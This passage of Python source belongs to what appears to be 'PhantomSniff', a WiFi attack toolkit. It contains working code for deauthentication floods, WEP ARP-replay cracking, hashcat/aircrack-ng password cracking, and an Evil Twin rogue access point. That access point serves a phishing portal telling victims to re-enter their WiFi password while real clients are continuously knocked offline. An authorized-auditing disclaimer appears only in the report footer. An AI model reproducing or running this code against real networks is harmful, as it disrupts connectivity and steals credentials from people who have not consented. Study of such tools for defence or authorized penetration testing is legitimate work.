                return self.result(False, detail="AP not vulnerable to Pixie Dust")
        tail = out.strip().splitlines()[-1][:80] if out.strip() else "no output"
        return self.result(False, detail="no PSK recovered: " + tail)


class DeauthAttack(Attack):
    """Standalone deauthentication. aireplay-ng -0 injects Deauthentication
    frames spoofed from the AP: targeted (-c CLIENT) drops one client,
    broadcast (no -c) affects all. mdk4 is the fallback injector."""
    KEY = "deauth"
    LABEL = "Deauthentication (targeted / broadcast)"
    DESC = "knock clients off the target AP (aireplay-ng -0 or mdk4 d)"
    REQUIRES = ["aireplay-ng"]

    def run(self, rounds=None):
        rounds = rounds or 3
        sent = 0
        for r in range(rounds):
            if shutil.which("aireplay-ng"):
                cmd = ["aireplay-ng", "-0", str(self.ctx.args.deauth_count),
                       "--ignore-negative-one", "-a", self.b]
                if self.client:
                    cmd += ["-c", self.client]
                sh(cmd + [self.iface], timeout=30)
                sent += self.ctx.args.deauth_count
            elif shutil.which("mdk4"):
                cmd = ["mdk4", self.iface, "d", "-B", self.b]
                if self.client:
                    cmd += ["-c", self.client]
                sh(cmd, timeout=10)
                sent += self.ctx.args.deauth_count
            else:
                return self.result(False, detail="no deauth tool available")
            Log.info(f"deauth round {r + 1}/{rounds} done (~{sent} frames total)")
            if r < rounds - 1:
                time.sleep(2)
        mode = f"targeted {self.client}" if self.client else "broadcast"
        return self.result(True, detail=f"{mode} deauth: ~{sent} frames sent")


class WEPAttack(Attack):
    """WEP statistical cracking via ARP replay. The attacker fake-authenticates
    (-1) to become a valid peer, then replays a captured ARP request (-3) to
    multiply network traffic: each ARP response reuses the same WEP keystream
    fragments, rapidly generating IVs. aircrack-ng's PTW attack then recovers
    the 104-bit key once ~5k-20k unique IVs are collected."""
    KEY = "wep"
    LABEL = "WEP fakeauth + ARP replay + PTW crack"
    DESC = "fakeauth -> aireplay-ng -3 -> IVs -> aircrack-ng"
    REQUIRES = ["airodump-ng", "aireplay-ng", "aircrack-ng"]

    def run(self, timeout=None):
        timeout = timeout or self.ctx.args.wep_timeout
        mymac = InterfaceManager.mac_of(self.iface)
        prefix = os.path.join(self.workdir, "wep")
        keyf = os.path.join(self.workdir, "wep.key")
        p = self.ctx.popen(
            ["airodump-ng", "-c", str(self.ch), "--bssid", self.b, "-w", prefix,
             "--output-format", "pcap,csv", self.iface],
            outfile=os.path.join(self.workdir, "airodump.log"))
        replay = None
        try:
            for _ in range(20):
                time.sleep(0.5)
                if glob.glob(prefix + "-0*.cap"):
                    break
            caps = glob.glob(prefix + "-0*.cap")
            if not caps:
                return self.result(False, detail="airodump-ng created no capture")
            cap = caps[0]
            Log.info("fake-authenticating with AP...")
            fake = ["aireplay-ng", "-1", "5", "-a", self.b, "-h", mymac]
            if self.net.essid and self.net.essid != "<hidden>":
                fake += ["-e", self.net.essid]
            fake += ["--ignore-negative-one", self.iface]
            rc, out = sh(fake, timeout=45)
            if "Association successful" not in out:
                Log.warn("fake-auth may have failed; ARP replay may still work")
            Log.info("starting ARP replay (aireplay-ng -3)...")
            replay = self.ctx.popen(
                ["aireplay-ng", "-3", "-b", self.b, "-h", mymac,
                 "--ignore-negative-one", self.iface],
                outfile=os.path.join(self.workdir, "replay.log"))
            # stir traffic to seed the first ARP (clients then generate more)
            sh(["aireplay-ng", "-0", "5", "--ignore-negative-one", "-a", self.b,
                self.iface], timeout=25)
            deadline, ivs = time.monotonic() + timeout, 0
            while time.monotonic() < deadline:
                time.sleep(20)
                csvs = sorted(glob.glob(prefix + "-0*.csv"), key=os.path.getmtime)
                if csvs:
                    ivs = self._ivs_from_csv(csvs[-1])
                Log.info(f"IVs collected: {ivs}")
                if ivs >= 5000:
                    Log.info("attempting aircrack-ng PTW...")
                    sh(["aircrack-ng", "-b", self.b, "-l", keyf, cap], timeout=180)
                    if os.path.exists(keyf) and os.path.getsize(keyf):
                        pw = open(keyf).read().strip()
                        Log.ok("WEP key recovered!")
                        return self.result(True, password=pw, cap=cap,
                                           detail=f"key after {ivs} IVs")
            return self.result(False, detail=f"timeout at {ivs} IVs "
                                             "(resume to continue collecting)")
        finally:
            self.ctx.kill_proc(p)
            self.ctx.kill_proc(replay)

    @staticmethod
    def _ivs_from_csv(path):
        try:
            mode = None
            with open(path, errors="replace") as fh:
                for line in fh:
                    if line.startswith("BSSID"):
                        mode = "ap"
                        continue
                    if line.startswith("Station MAC"):
                        return 0
                    f = [x.strip() for x in line.split(",")]
                    if mode == "ap" and len(f) >= 15:
                        return int(f[10] or 0)
        except (OSError, ValueError):
            pass
        return 0


# --------------------------- Evil Twin portal ------------------------------

PORTAL_TPL = Template("""<!doctype html><html><head><meta charset="utf-8">
<title>$title</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0b1020;color:#eee;
display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#151b2e;padding:32px;border-radius:14px;max-width:360px;width:90%;
box-shadow:0 10px 40px rgba(0,0,0,.5)}
h1{font-size:20px;margin:0 0 8px;color:#fff}p{color:#9aa3b5;font-size:14px;line-height:1.5}
input{width:100%;padding:12px;margin:12px 0;border-radius:8px;border:1px solid #2a3350;
background:#0b1020;color:#eee;box-sizing:border-box}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#3b82f6;color:#fff;
font-weight:600;cursor:pointer}
.foot{margin-top:14px;font-size:11px;color:#6b7280;text-align:center}
</style></head><body><div class="card"><h1>$title</h1><p>$body</p>
<form method="POST" action="/submit">
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button></form>
<div class="foot">$essid</div></div></body></html>""")


class PortalHandler(BaseHTTPRequestHandler):
    """Captive-portal HTTP handler: login page, passphrase collection,
    verification-status pages."""
    server_version = "PhantomPortal/1.0"

    def log_message(self, *a):
        pass

    def _send(self, code, html):
        data = html.encode("utf-8", "replace")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self._send(200, self.server.pages["login"])
        elif self.path in ("/check", "/status"):
            self._send(200, self.server.pages["success" if self.server.cracked
                                               else "checking"])
        else:
            self.send_response(204)
            self.end_headers()

    def do_POST(self):
        if self.path != "/submit":
            return self._send(404, "<h1>404</h1>")
        try:
            length = int(self.headers.get("Content-Length", 0) or 0)
            body = self.rfile.read(min(length, 4096)).decode("utf-8", "replace")
            pw = urllib.parse.parse_qs(body).get("password", [""])[0]
        except Exception:
            pw = ""
        if pw:
            self.server.submit(pw)
        self._send(200, self.server.pages["checking"])


class PortalServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, handler, pages):
        self.pages = pages
        self.cracked = False
        self._q = deque()
        self._lock = threading.Lock()
        super().__init__(addr, handler)

    def submit(self, pw):
        with self._lock:
            self._q.append(pw)

    def next_candidate(self):
        with self._lock:
            return self._q.popleft() if self._q else None


class EvilTwinAttack(Attack):
    """Rogue AP / captive portal. hostapd clones the target SSID as an OPEN
    network; dnsmasq provides DHCP + wildcard DNS so clients resolve everything
    to the attacker; iptables NAT redirects port 80/443 to the local portal.
    Clients that auto-reconnect hit the portal and submit the WiFi passphrase.
    KEY SAFETY PROPERTY: every submission is verified against a previously
    captured handshake (aircrack-ng) or PMKID hash (hashcat) before being
    reported as a finding - wrong guesses are never presented as results."""
    KEY = "eviltwin"
    LABEL = "Evil Twin rogue AP + credential portal"
    DESC = "hostapd+dnsmasq portal; submissions verified vs handshake/PMKID"
    REQUIRES = ["hostapd", "dnsmasq", "iptables"]

    def run(self, timeout=None):
        timeout = timeout or self.ctx.args.et_timeout
        if self.net.essid in ("", "<hidden>"):
            return self.result(False, detail="target SSID is hidden - cannot clone")
        for tool in self.REQUIRES:
            if not shutil.which(tool):
                return self.result(False, detail=f"{tool} not installed")
        managed = self.ctx.ensure_managed()
        if not managed:
            return self.result(False, detail="no managed interface for hostapd")

        self.cap = self.ctx.find_cap_for(self.b)
        self.hashf = self.ctx.find_hash_for(self.b)
        if not self.cap and not self.hashf:
            Log.warn("no handshake/PMKID reference - submissions will be unverified")

        hconf = os.path.join(self.workdir, "hostapd.conf")
        dconf = os.path.join(self.workdir, "dnsmasq.conf")
        portal_log = os.path.join(self.workdir, "portal_creds.txt")
        essid = self.net.essid.replace('"', "").replace("\n", "")
        with open(hconf, "w") as fh:
            fh.write(f"interface={managed}\ndriver=nl80211\nssid={essid}\n"
                     f"channel={self.ch}\nhw_mode={'a' if self.ch > 14 else 'g'}\n"
                     f"auth_algs=1\nwmm_enabled=0\nmax_num_sta=16\n")
        with open(dconf, "w") as fh:
            fh.write(f"interface={managed}\nbind-interfaces\ndhcp-authoritative\n"
                     f"pid-file={self.workdir}/dnsmasq.pid\n"
                     f"dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
                     f"dhcp-option=3,{GW}\ndhcp-option=6,{GW}\n"
                     f"address=/#/{GW}\nno-resolv\n")

        def nat(action, dport):
            return ["-t", "nat", action, "PREROUTING", "-i", managed, "-p", "tcp",
                    "--dport", dport, "-j", "DNAT",
                    "--to-destination", f"{GW}:{PORTAL_PORT}"]

        add_rules = [nat("-A", "80"), nat("-A", "443")]
        del_rules = [nat("-D", "80"), nat("-D", "443")]
        pages = {
            "login": PORTAL_TPL.substitute(
                title="Connection Problem", essid=essid,
                body="Your device lost connection to <b>{}</b>. Re-enter your WiFi "
                     "password to restore the link.".format(essid)),
            "checking": PORTAL_TPL.substitute(title="Checking...", essid=essid,
                                              body="Verifying your password, please wait..."),
            "success": PORTAL_TPL.substitute(title="Connected", essid=essid,
                                             body="Success! Your device is now connected."),
        }
        portal = hostapd = dnsmasq = None
        self._stop = threading.Event()
        try:
            sh(["ip", "addr", "add", PORTAL_NET, "dev", managed], timeout=10)
            sh(["ip", "link", "set", managed, "up"], timeout=10)
            for r in add_rules:
                sh(["iptables"] + r, timeout=10)
            dnsmasq = self.ctx.popen(["dnsmasq", "-C", dconf],
                                     outfile=os.path.join(self.workdir, "dnsmasq.log"))
            hostapd = self.ctx.popen(["hostapd", hconf],
                                     outfile=os.path.join(self.workdir, "hostapd.log"))
            ap_up = False
            for _ in range(20):
                time.sleep(1)
                try:
                    if "AP-ENABLED" in open(os.path.join(self.workdir,
                                                         "hostapd.log")).read():
                        ap_up = True
                        break
                except OSError:
                    pass
            if not ap_up:
                return self.result(False, detail="hostapd failed - see hostapd.log")
            Log.ok(f"rogue AP '{essid}' up on ch{self.ch} (portal :{PORTAL_PORT})")
            portal = PortalServer(("0.0.0.0", PORTAL_PORT), PortalHandler, pages)
            threading.Thread(target=portal.serve_forever, daemon=True).start()

            d_iface = self.ctx.args.deauth_iface
            if d_iface and d_iface != managed:
                mon2 = InterfaceManager.enable_monitor(d_iface, use_airmon=False)
                threading.Thread(target=self._deauth_loop, args=(mon2,),
                                 daemon=True).start()

            deadline = time.monotonic() + timeout
            candidates, last_pw = 0, None
            Log.info(f"portal live; waiting for submissions (max {timeout}s)")
            while time.monotonic() < deadline and not portal.cracked and candidates < 20:
                cand = portal.next_candidate()
                if not cand:
                    time.sleep(1)
                    continue
                candidates += 1
                with open(portal_log, "a") as fh:
                    fh.write(f"[{time.strftime('%H:%M:%S')}] submission: {cand}\n")
                Log.info(f"submission #{candidates} captured - verifying...")
                if self._verify(cand) == "verified":
                    portal.cracked = True
                    last_pw = cand
                    break
                last_pw = last_pw or cand
            time.sleep(3)  # let clients fetch the success page
            if last_pw:
                status = "verified against capture" if portal.cracked else \
                    "unverified candidate (no reference capture available)"
                Log.ok(f"credential candidate: {last_pw} ({status})")
                return self.result(True, password=last_pw, detail=status,
                                   cap=self.cap, hash22000=self.hashf,
                                   portal_log=portal_log)
            return self.result(False, detail="no valid submission within timeout",
                               cap=self.cap, hash22000=self.hashf)
        finally:
            self._stop.set()
            if portal:
                try:
                    portal.shutdown()
                    portal.server_close()
                except Exception:
                    pass
            self.ctx.kill_proc(hostapd)
            self.ctx.kill_proc(dnsmasq)
            for r in del_rules:
                sh(["iptables"] + r, timeout=10)
            sh(["ip", "addr", "del", PORTAL_NET, "dev", managed], timeout=10)
            self.ctx.ensure_monitor()

    def _deauth_loop(self, iface):
        """Keep knocking real clients off via a SECOND adapter in monitor mode
        so their devices re-associate onto the rogue AP."""
        while not self._stop.is_set():
            if shutil.which("aireplay-ng"):
                sh(["aireplay-ng", "-0", "3", "--ignore-negative-one", "-a", self.b,
                    iface], timeout=25)
            self._stop.wait(20)

    def _verify(self, password):
        """Verify a submission against reference capture material."""
        candfile = os.path.join(self.workdir, "cand.txt")
        keyf = os.path.join(self.workdir, "verified.key")
        with open(candfile, "w") as fh:
            fh.write(password + "\n")
        if self.cap and os.path.exists(self.cap):
            sh(["aircrack-ng", "-b", self.b, "-w", candfile, "-l", keyf, self.cap],
               timeout=180)
            if os.path.exists(keyf) and os.path.getsize(keyf):
                return "verified"
            return "unverified"
        if self.hashf and shutil.which("hashcat"):
            found = os.path.join(self.workdir, "hc_found.txt")
            rc, _ = sh(["hashcat", "-m", "22000", "--potfile-disable",
                        "--outfile-format=2", "-o", found, self.hashf, candfile],
                       timeout=300)
            if rc == 0 and os.path.exists(found) and os.path.getsize(found):
                return "verified"
        return "unverified"


ATTACKS = {cls.KEY: cls for cls in
           (HandshakeAttack, PMKIDAttack, WPSPixieAttack, DeauthAttack,
            WEPAttack, EvilTwinAttack)}


# ---------------------------------------------------------------------------
# Cracking engine
# ---------------------------------------------------------------------------

SPEED_RE = re.compile(r"Speed\.#\d+\.*:\s*([0-9.,]+\s*[KMGTH]?H/s)")
PROG_RE = re.compile(r"Progress\.+:\s*(\d+)/(\d+)\s*\(([\d.]+)%\)")
ETA_RE = re.compile(r"Time\.Estimated\.+:\s*(.+)")
STAT_RE = re.compile(r"Status\.+:\s*([A-Za-z ]+)")
AIR_PROG_RE = re.compile(r"(\d+)/(\d+)\s+keys?\s*tested")
AIR_SPEED_RE = re.compile(r"([0-9.]+)\s*k/s", re.I)
KEYFOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(.*?)\s*\]")

ROCKYOU_URLS = [
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
]


class CrackEngine:
    RULE_DIRS = ["/usr/share/hashcat/rules", "/usr/local/share/hashcat/rules",
                 "/opt/hashcat/rules", "/usr/local/opt/hashcat/rules"]

    def __init__(self, ctx):
        self.ctx = ctx
        self.workdir = os.path.join(self.ctx.outdir, "crack")
        os.makedirs(self.workdir, exist_ok=True)

    # --- GPU detection ------------------------------------------------------
    def gpu_devices(self):
        """Parse `hashcat -I` device blocks; a device is a GPU when its
        'Type' field says GPU. nvidia-smi is a secondary confirmation."""
        devs, cur = [], None
        if shutil.which("hashcat"):
            rc, out = sh(["hashcat", "-I"], timeout=90)
            for line in out.splitlines():
                if re.match(r"\s*Device ID #\d+", line):
                    cur = {"name": "", "type": ""}
                    devs.append(cur)
                elif cur is not None:
                    if "Name" in line and ":" in line:
                        cur["name"] = line.split(":", 1)[1].strip()
                    elif "Type" in line and ":" in line:
                        cur["type"] = line.split(":", 1)[1].strip().lower()
        gpus = [d for d in devs if d["type"].lower() == "gpu"]
        if not gpus and shutil.which("nvidia-smi"):
            if sh(["nvidia-smi"], timeout=15)[0] == 0:
                gpus = [{"name": "NVIDIA device (nvidia-smi)", "type": "gpu"}]
        return gpus

    # --- capture conversion ---------------------------------------------------
    def convert_to_22000(self, cap, dest):
        """aircrack .cap -> hashcat mode 22000 via hcxpcapngtool."""
        if not cap or not shutil.which("hcxpcapngtool"):
            return None
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        rc, out = sh(["hcxpcapngtool", "-o", dest, cap], timeout=180)
        if os.path.exists(dest) and os.path.getsize(dest) > 10:
            return dest
        Log.dbg("hcxpcapngtool: " + out[-200:])
        return None

    # --- wordlist management ---------------------------------------------------
    def ensure_wordlist(self, custom=None):
        wl_dir = os.path.join(self.ctx.outdir, "wordlists")
        os.makedirs(wl_dir, exist_ok=True)
        if custom:
            if os.path.isfile(custom):
                return os.path.abspath(custom)
            raise PhantomError(f"wordlist not found: {custom}")
        rockyou = os.path.join(wl_dir, "rockyou.txt")
        for p in ("/usr/share/wordlists/rockyou.txt",
                  "/usr/share/wordlists/rockyou.txt.gz", rockyou,
                  os.path.expanduser("~/wordlists/rockyou.txt")):
            if os.path.isfile(p):
                if p.endswith(".gz"):
                    if not os.path.isfile(rockyou):
                        Log.info(f"decompressing {p} ...")
                        with gzip.open(p, "rb") as src, open(rockyou, "wb") as dst:
                            shutil.copyfileobj(src, dst, 1 << 20)
                    return rockyou
                return p
        Log.warn("rockyou.txt not found - downloading (~130MB, one-time)...")
        for url in ROCKYOU_URLS:
            try:
                dest = rockyou + ".tmp"
                req = urllib.request.Request(url, headers={"User-Agent": "phantomsniff"})
                with urllib.request.urlopen(req, timeout=60) as resp, open(dest, "wb") as fh:
                    total = 0
                    while True:
                        chunk = resp.read(1 << 20)
                        if not chunk:
                            break
                        fh.write(chunk)
                        total += len(chunk)
                        if total % (16 << 20) < (1 << 20):
                            Log.info(f"downloaded {total >> 20} MB ...")
                if url.endswith(".gz"):
                    with gzip.open(dest, "rb") as src, open(rockyou, "wb") as dst:
                        shutil.copyfileobj(src, dst, 1 << 20)
                    os.remove(dest)
                else:
                    os.rename(dest, rockyou)
                if os.path.getsize(rockyou) > 5 << 20:
                    Log.ok(f"wordlist ready: {rockyou}")
                    return rockyou
            except Exception as e:
                Log.warn(f"download failed ({url}): {e}")
        raise PhantomError("could not obtain a wordlist; pass --wordlist <path>")

    def find_rule(self, name):
        for d in self.RULE_DIRS:
            p = os.path.join(d, name)
            if os.path.isfile(p):
                return p
        return None

    # --- live progress rendering -------------------------------------------------
    @staticmethod
    def _render(prefix, last):
        pct = last.get("pct")
        bar = ""
        if pct is not None:
            filled = int(pct / 100 * 22)
            bar = "#" * filled + "-" * (22 - filled)
        line = "[{}] {:>14} | {:>6}% {} | ETA {}".format(
            prefix, last.get("speed", "?"), "--" if pct is None else round(pct, 1),
            bar, last.get("eta", "?"))
        if sys.stdout.isatty():
            sys.stdout.write("\r" + line[:110].ljust(110))
            sys.stdout.flush()

    # --- hashcat runner -------------------------------------------------------------
    def _run_hashcat(self, cmd, found, timeout=14400):
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1, errors="replace",
                             start_new_session=True)
        self.ctx.procs.append(p)
        last, t0 = {}, time.monotonic()
        try:
            for line in p.stdout:
                line = line.strip()
                m = SPEED_RE.search(line)
                if m:
                    last["speed"] = m.group(1)
                m = PROG_RE.search(line)
                if m:
                    last["pct"] = float(m.group(3))
                m = ETA_RE.search(line)
                if m:
                    last["eta"] = m.group(1).strip()[:30]
                m = STAT_RE.search(line)
                if m:
                    last["status"] = m.group(1).strip()
                if any(k in line for k in ("Speed", "Progress", "Time.Estimated",
                                           "Status")) and last:
                    self._render("hashcat", last)
        finally:
            try:
                p.wait(timeout=60)
            except Exception:
                p.kill()
            if sys.stdout.isatty():
                sys.stdout.write("\n")
        self.ctx.kill_proc(p)
        password = ""
        if os.path.exists(found):
            with open(found, errors="replace") as fh:
                for ln in fh:
                    if ln.strip():
                        password = ln.strip()
                        break
        return {"cracked": bool(password) or last.get("status", "").lower() == "cracked",
                "password": password, "stats": last,
                "elapsed": time.monotonic() - t0}

    def _hc_base(self, found, gpus):
        cmd = ["hashcat", "-m", "22000", "--potfile-disable", "--status",
               "--status-timer=5", "--outfile-format=2", "-o", found]
        if not gpus:
            cmd.append("--force")  # consumer CPU OpenCL runtimes often need it
        return cmd

    def dictionary_attack(self, hashfile, wordlist, rule=None, found=None, gpus=None):
        """Dictionary attack: hashcat -m 22000, optionally rule-mutated."""
        cmd = self._hc_base(found, gpus) + [hashfile, wordlist]
        if rule:
            cmd += ["-r", rule]
        Log.info("hashcat dictionary attack" +
                 (f" + rule {os.path.basename(rule)}" if rule else ""))
        return self._run_hashcat(cmd, found)

    def mask_attack(self, hashfile, mask, found=None, gpus=None):
        """Mask/brute-force. WPA passwords are >=8 chars, so masks of >=8
        positions run with --increment (8..N) instead of as a fixed mask."""
        n = len(re.findall(r"\?[a-zA-Z0-9?]", mask))
        cmd = self._hc_base(found, gpus) + ["-a", "3", hashfile, mask]
        if n >= 8:
            cmd += ["--increment", "--increment-min=8", f"--increment-max={n}"]
        Log.info(f"hashcat mask attack: {mask}")
        return self._run_hashcat(cmd, found)

    # --- aircrack-ng CPU fallback -----------------------------------------------------
    def aircrack_crack(self, cap, bssid, wordlist, timeout=14400):
        threads = pool_size(self.ctx.args.threads)
        keyf = os.path.join(self.workdir, "ac.key")
        cmd = ["aircrack-ng", "-b", bssid, "-w", wordlist, "-p", str(threads),
               "-l", keyf, cap]
        Log.info(f"aircrack-ng CPU fallback ({threads} threads)")
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1, errors="replace",
                             start_new_session=True)
        self.ctx.procs.append(p)
        last, t0, password = {}, time.monotonic(), ""
        try:
            for line in p.stdout:
                m = AIR_PROG_RE.search(line)
                if m:
                    done, total = int(m.group(1)), int(m.group(2))
                    if total:
                        last["pct"] = done / total * 100
                m = AIR_SPEED_RE.search(line)
                if m:
                    last["speed"] = m.group(1) + " k/s"
                m = KEYFOUND_RE.search(line)
                if m:
                    password = m.group(1)
                if last and p.poll() is None:
                    self._render("aircrack", last)
            try:
                p.wait(timeout=60)
            except Exception:
                p.kill()
        finally:
            self.ctx.kill_proc(p)
            if sys.stdout.isatty():
                sys.stdout.write("\n")
        if not password and os.path.exists(keyf):
            password = open(keyf).read().strip()
        return {"cracked": bool(password), "password": password, "stats": last,
                "elapsed": time.monotonic() - t0}

    # --- orchestrator --------------------------------------------------------------------
    def auto_crack(self, cap, bssid, essid, hashfile=None):
        """Pipeline: convert -> hashcat (GPU/CPU) + rules -> mask fallback ->
        aircrack-ng CPU fallback. Reports live H/s, progress %% and ETA."""
        t0 = time.monotonic()
        gpus = self.gpu_devices()
        if gpus:
            Log.ok("GPU detected: " + ", ".join(d["name"] or "GPU" for d in gpus))
        else:
            Log.warn("no GPU detected - hashcat CPU / aircrack-ng fallback")
        if not hashfile:
            dest = os.path.join(self.ctx.outdir, "hashes",
                                "hash_{}.22000".format(bssid.replace(":", "")))
            hashfile = self.convert_to_22000(cap, dest)
            if hashfile:
                Log.ok(f"converted capture -> {hashfile}")
        try:
            wordlist = self.ensure_wordlist(self.ctx.args.wordlist)
        except PhantomError as e:
            wordlist = None
            Log.warn(str(e))
        found = os.path.join(self.workdir, "cracked.txt")
        result = {"cracked": False, "password": "", "method": "", "speed": "",
                  "elapsed": 0}
        use_hashcat = shutil.which("hashcat") and hashfile
        if use_hashcat and wordlist:
            rule = self.find_rule(self.ctx.args.rule) if self.ctx.args.rule else None
            if self.ctx.args.rule and not rule:
                Log.dbg(f"rule {self.ctx.args.rule} not found; plain dictionary")
            r = self.dictionary_attack(hashfile, wordlist, rule, found, gpus)
            result.update(cracked=r["cracked"], password=r["password"],
                          method="hashcat dictionary" +
                                 (f" + {os.path.basename(rule)}" if rule else ""),
                          speed=r["stats"].get("speed", ""), elapsed=r["elapsed"])
        if not result["cracked"] and use_hashcat and \
                (self.ctx.args.mask or
                 (not self.ctx.args.headless and
                  self.ctx.ask_yn("Try brute-force mask attack (slow)?", False))):
            mask = self.ctx.args.mask or "?d?d?d?d?d?d?d?d"
            r = self.mask_attack(hashfile, mask, found, gpus)
            result.update(cracked=r["cracked"], password=r["password"],
                          method=f"hashcat mask {mask}",
                          speed=r["stats"].get("speed", ""), elapsed=r["elapsed"])
        if not result["cracked"] and not use_hashcat and cap and wordlist:
            r = self.aircrack_crack(cap, bssid, wordlist)
            result.update(cracked=r["cracked"], password=r["password"],
                          method="aircrack-ng CPU", speed=r["stats"].get("speed", ""),
                          elapsed=r["elapsed"])
        if not result["cracked"]:
            result["elapsed"] = time.monotonic() - t0
        return result


# ---------------------------------------------------------------------------
# Reporting: JSON + dependency-free PDF (hand-rolled minimal PDF writer)
# ---------------------------------------------------------------------------

class MiniPDF:
    """Tiny single-file PDF generator: Helvetica text, A4, auto page breaks,
    correct xref/trailer. Avoids a reportlab dependency for low-footprint use."""

    W, H, MX = 595, 842, 54

    def __init__(self):
        self.pages = [[]]
        self.y = self.H - 60

    def add(self, text, size=10, bold=False, lead=None):
        lead = lead or size + 4
        font = "F2" if bold else "F1"
        for chunk in str(text).split("\n"):
            if self.y < 70:
                self.pages.append([])
                self.y = self.H - 60
            esc = self._esc(chunk)
            op = "BT /{} {} Tf {} {} Td ({}) Tj ET".format(
                font, size, self.MX, int(self.y), esc)
            self.pages[-1].append(op)
            self.y -= lead

    @staticmethod
    def _esc(s):
        s = s.encode("latin-1", "replace").decode("latin-1")
        return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")

    def save(self, path):
        objs = {}
        first = 5
        kids = []
        for i in range(len(self.pages)):
            pid = first + 2 * i
            kids.append(f"{pid} 0 R")
            body = "\n".join(self.pages[i])
            blen = len(body.encode("latin-1", "replace"))
            objs[pid] = ("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] "
                         "/Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> "
                         "/Contents %d 0 R >>" % (self.W, self.H, pid + 1))
            objs[pid + 1] = "<< /Length %d >>\nstream\n%s\nendstream" % (blen, body)
        objs[1] = "<< /Type /Catalog /Pages 2 0 R >>"
        objs[2] = "<< /Type /Pages /Kids [%s] /Count %d >>" % (
            " ".join(kids), len(self.pages))
        objs[3] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        objs[4] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>"
        out = bytearray(b"%PDF-1.4\n")
        offsets = {}
        for num in sorted(objs):
            offsets[num] = len(out)
            out += f"{num} 0 obj\n".encode("latin-1")
            out += objs[num].encode("latin-1", "replace")
            out += b"\nendobj\n"
        xref = len(out)
        maxn = max(objs)
        out += f"xref\n0 {maxn + 1}\n".encode()
        out += b"0000000000 65535 f \n"
        for num in range(1, maxn + 1):
            out += f"{offsets.get(num, 0):010d} 00000 n \n".encode()
        out += f"trailer\n<< /Size {maxn + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
        with open(path, "wb") as fh:
            fh.write(out)


class Report:
    def __init__(self, args):
        self.data = {
            "tool": __tool__, "version": __version__,
            "generated": datetime.now().isoformat(timespec="seconds"),
            "interface": None, "options": vars(args),
            "scan": None, "attacks": [], "cracks": [],
        }

    def set_scan(self, nets):
        self.data["scan"] = {"count": len(nets),
                             "networks": [n.to_dict() for n in nets.values()]}

    def add_attack(self, res):
        self.data["attacks"].append(res)

    def add_crack(self, res):
        self.data["cracks"].append(res)

    def save_json(self, path):
        with open(path, "w") as fh:
            json.dump(self.data, fh, indent=2, default=str)
        return path

    def save_pdf(self, path):
        pdf = MiniPDF()
        pdf.add(f"{__tool__} v{__version__} - WiFi Security Audit Report", 18, bold=True)
        pdf.add(f"Generated: {self.data['generated']}")
        pdf.add(f"Interface: {self.data.get('interface') or 'n/a'}")
        pdf.add("")
        pdf.add("Discovered Networks", 14, bold=True)
        scan = self.data.get("scan") or {}
        for n in scan.get("networks", []):
            pdf.add("  {essid} ({bssid}) ch{channel} {privacy} pwr {power}dBm "
                    "clients={clients} WPS={wps} score={score}".format(**n))
        if not scan:
            pdf.add("  (no scan data)")
        pdf.add("")
        pdf.add("Attacks Performed", 14, bold=True)
        for a in self.data["attacks"]:
            pdf.add(f"  [{a['type']}] {a.get('essid', '')} {a['target']} -> "
                    f"{'SUCCESS' if a['success'] else 'failed'}", 10, bold=a["success"])
            if a.get("detail"):
                for ln in textwrap.wrap("    " + str(a["detail"]), width=95,
                                        subsequent_indent="      "):
                    pdf.add(ln)
            if a.get("cap"):
                pdf.add(f"    capture: {a['cap']}")
        if not self.data["attacks"]:
            pdf.add("  (none)")
        pdf.add("")
        pdf.add("Cracked Credentials", 14, bold=True)
        for cr in self.data["cracks"]:
            pw = cr.get("password", "")
            pdf.add(f"  {cr.get('target', '')} via {cr.get('method', '')} -> "
                    f"{'PASSWORD FOUND' if pw else 'failed'}", 10, bold=bool(pw))
            if pw:
                pdf.add(f"    password: {pw}")
        if not self.data["cracks"]:
            pdf.add("  (none)")
        pdf.add("")
        pdf.add("Produced with the network owner's authorization. PhantomSniff "
                "is for lawful security auditing only.", 9)
        pdf.save(path)
        return path


# ---------------------------------------------------------------------------
# Main application controller
# ---------------------------------------------------------------------------

class PhantomSniff:
    def __init__(self, args):
        self.args = args
        self.outdir = os.path.abspath(args.output_dir)
        self.report = Report(args)
        self.procs = []
        self.iface = None        # current working interface
        self.orig_iface = None   # user-selected physical interface
        self.killed_mgrs = False
        self.nets = {}
        self.last_attack = None
        self.last_target = None

    # ------------------------------ plumbing ---------------------------------
    def popen(self, cmd, outfile=None, quiet=True):
        Log.dbg("$ " + " ".join(shlex.quote(x) for x in cmd))
        fh = open(outfile, "w") if outfile else None
        stdout = fh if fh else (subprocess.DEVNULL if quiet else subprocess.PIPE)
        p = subprocess.Popen(cmd, stdout=stdout, stderr=subprocess.STDOUT,
                             text=True, errors="replace", start_new_session=True)
        p._logfh = fh
        self.procs.append(p)
        return p

    def kill_proc(self, p):
        if p is None:
            return
        try:
            p.terminate()
            p.wait(timeout=4)
        except Exception:
            try:
                p.kill()
                p.wait(timeout=4)
            except Exception:
                pass
